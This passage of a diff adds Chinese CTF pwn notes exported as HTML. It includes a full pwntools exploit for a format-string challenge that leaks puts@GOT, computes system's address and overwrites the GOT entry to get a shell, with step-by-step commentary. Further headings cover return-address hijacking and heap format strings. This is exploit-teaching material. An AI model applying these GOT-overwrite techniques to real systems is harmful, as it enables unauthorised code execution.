+    sh.sendline(name)&#13;
+&#13;
+&#13;
+##password&#13;
+password()&#13;
+## get the addr of puts&#13;
+puts_got = pwn3.got['puts']&#13;
+log.success('puts got : ' + hex(puts_got))&#13;
+put('1111', '%8$s' + p32(puts_got))&#13;
+puts_addr = u32(get('1111')[:4])&#13;
+&#13;
+## get addr of system&#13;
+libc = LibcSearcher("puts", puts_addr)&#13;
+system_offset = libc.dump('system')&#13;
+puts_offset = libc.dump('puts')&#13;
+system_addr = puts_addr - puts_offset + system_offset&#13;
+log.success('system addr : ' + hex(system_addr))&#13;
+&#13;
+## modify puts@got, point to system_addr&#13;
+payload = fmtstr_payload(7, {puts_got: system_addr})&#13;
+put('/bin/sh;', payload)&#13;
+sh.recvuntil('ftp&gt;')&#13;
+sh.sendline('get')&#13;
+sh.recvuntil('enter the file name you want to get:')&#13;
+##gdb.attach(sh)&#13;
+sh.sendline('/bin/sh;')&#13;
+&#13;
+## system('/bin/sh')&#13;
+show_dir()&#13;
+sh.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="582tqts81p68i129mpkpaaiv2r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp = 'sysbdmin'&#13;
+name = ""&#13;
+for i in tmp:&#13;
+    name += chr(ord(i) - 1)&#13;
+## password&#13;
+def password():&#13;
+    sh.recvuntil('Name (ftp.hacker.server:Rainism):')&#13;
+    sh.sendline(name)&#13;
+##password&#13;
+password()</a>
+</h3>
+<h3 class="topic">
+<a name="6k709t20t30098cfm586quejl0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这部分推测是通过分析程序，从而计算程序登陆的用户名，从而绕过密码验证</a>
+</h3>
+<h3 class="topic">
+<a name="0nkdf5vlgfhdpsidnkusf4umcs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_got = pwn3.got['puts']&#13;
+log.success('puts got : ' + hex(puts_got))&#13;
+put('1111', '%8$s' + p32(puts_got))&#13;
+puts_addr = u32(get('1111')[:4])</a>
+</h3>
+<h3 class="topic">
+<a name="1hjdfgivvqlf99ebehhh1sihge">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过put函数，添加文件名为'1111' 内容为'%8$s' + p32(puts_got)的数据</a>
+</h3>
+<h3 class="topic">
+<a name="1blceeii67ffetvclu55ru9n7v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过执行get('1111')，将文件'1111'的内容输出，即相当于执行printf('%8$s' + p32(puts_got)); 根据分析，此时输出函数的格式化字符串的首地址的偏移是 7，而%8$s占4个字节，所以p32(puts_got)为相对于格式化字符串的第8个参数，所以输出的前四个字节为put函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="7jk4uk1pkdood74ordnd7tfbvl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc = LibcSearcher("puts", puts_addr)&#13;
+system_offset = libc.dump('system')&#13;
+puts_offset = libc.dump('puts')&#13;
+system_addr = puts_addr - puts_offset + system_offset&#13;
+log.success('system addr : ' + hex(system_addr))</a>
+</h3>
+<h3 class="topic">
+<a name="1bf0j1ddvvgkofc2qkmu29l863">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过获得的puts函数地址，获得system函数的地址，这里要注意libc.dump()函数的用法，是LibcSeacher模块提供的一个函数</a>
+</h3>
+<h3 class="topic">
+<a name="1t5odp6ive3jv211si7cejq274">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## modify puts@got, point to system_addr&#13;
+payload = fmtstr_payload(7, {puts_got: system_addr})&#13;
+put('/bin/sh;', payload)&#13;
+sh.recvuntil('ftp&gt;')&#13;
+sh.sendline('get')&#13;
+sh.recvuntil('enter the file name you want to get:')&#13;
+##gdb.attach(sh)&#13;
+sh.sendline('/bin/sh;')</a>
+</h3>
+<h3 class="topic">
+<a name="5iuttd89hmsrli3ir7nb6tc0c8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fmtstr_payload是pwntools中的函数 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</a>
+</h3>
+<h3 class="topic">
+<a name="648sp7hgghg6p61mnmcucroti2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过fmtstr_payload函数获得payload之后，将其作为文件名为'/bin/sh'的文件的内容，然后调用get函数输出文件'/bin/sh'的内容，从而使用printf函数输出作为文件内容的payload，从而将system_addr写入puts_got起始的内存中</a>
+</h3>
+<h3 class="topic">
+<a name="1hidk2fmgoc456l2stkiutn9hj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## system('/bin/sh')&#13;
+show_dir()&#13;
+sh.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="2hrdji7pbfp0vicn6r1b85s892">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调用dir函数输出所有目录，dir函数内部此时使用puts函数输出文件名，当执行puts('/bin/sh')时，就相当于执行system('/bin/sh')</a>
+</h3>
+<h3 class="topic">
+<a name="2iqqe8a0qqr4d8vlovbdc5dfve">&nbsp;&nbsp;&nbsp;hijack retaddr</a>
+</h3>
+<h3 class="topic">
+<a name="1hp3sfv3j31ifdtpdd4dgheq9p">&nbsp;&nbsp;&nbsp;&nbsp;漏洞原理：很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</a>
+</h3>
+<h3 class="topic">
+<a name="0sl602879eqg153qcpup2kgv9d">&nbsp;&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="76mrcar4a084ake2aroppnhgcc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三个白帽-pwnme_k0</a>
+</h3>
+<h3 class="topic">
+<a name="6m8tim70a91ehh3o4u1hnb8bu0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析程序</a>
+</h3>
+<h3 class="topic">
+<a name="3mb2asd0nq5fbuhrn70qmhp2s0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5akbjin9uj6k923n8asj0ocr0n.png"></p>
+<h3 class="topic">
+<a name="03i90omit39na9vtn39iuoo5ef">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2ll78a83duqnn8h7a1fb8qsmmj.png"></p>
+<h3 class="topic">
+<a name="465ki5k6pj8rbjl8sns0s6nmo7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5956r0fcs0jnt81f6qr9a71i99.png"></p>
+<h3 class="topic">
+<a name="2a43s4tpsch5ug1192j0b4rrij">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="0bvpkbr876408vhhd3gqhk7cdc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;说明最终目的是执行地址0x4008a6处的system函数调用</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3f45vofp4i03dijt3r44q25lcd.png"></p>
+<h3 class="topic">
+<a name="7lhe5aumva4b9146f260ukdg6u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/38i1g4c3qb10a636v0ej8ir7oi.png"></p>
+<h3 class="topic">
+<a name="3libhmssl2298ad6nu9h23nl2l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3tle7b798jg5qkjkjm488oubf8.png"></p>
+<h3 class="topic">
+<a name="5c91b6ftpth79rsdo58bv1n145">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2a2qmedav7rsbfdhpjvluljtci.png"></p>
+<h3 class="topic">
+<a name="2hpi2tnv8grd61ge52jhajg6te">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/1um0ljqptjeff70vab3i0jrf1r.png"></p>
+<h3 class="topic">
+<a name="1cs26cm85h1leqeo478dcef9um">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="0tncibnp5oa3a3b45l9fms04ck">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4rv9ejnuh1onrh5pj2gmscfvpa.png"></p>
+<h3 class="topic">
+<a name="4hk5mn1nl5r4s9j1rk8bho2pu4">&nbsp;&nbsp;堆上的格式化字符串漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="3aao4s3o7bmpi4rh7lfgj03g46">&nbsp;&nbsp;&nbsp;原理：所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。</a>
+</h3>
+<h3 class="topic">
+<a name="0a8j6e69atu1eh060k8heqd83h">&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="49dtgouhrk0f2rkd0ukulkag47">&nbsp;&nbsp;&nbsp;&nbsp; 2015 年 CSAW 中的 contacts </a>
+</h3>
+<h3 class="topic">
+<a name="4094sln9l11u839k9adai44i7c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析程序</a>
+</h3>
+<h3 class="topic">
+<a name="0volng2fabfcd60shi6d4a56mn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/1k1jplpovn0gio1mjai81mq187.png"></p>
+<h3 class="topic">
+<a name="478k2fkp27093m3glkudoafef9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="3q4o2v4pjfq3cvkr31uau8bkk7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7kgo4ta1gh6idd0lt6ajkp3d5m.png"></p>
+<h3 class="topic">
+<a name="2dkaoe04nmpfn74e3akjj3e2hl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4i6fg2jbkaactet90vbnj1bgp3.png"></p>
+<h3 class="topic">
+<a name="4a45q2v6qgtt54sul0toicumja">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/33uv0smmfcikvjekn1frjjrabe.png"></p>
+</body>
+</html>
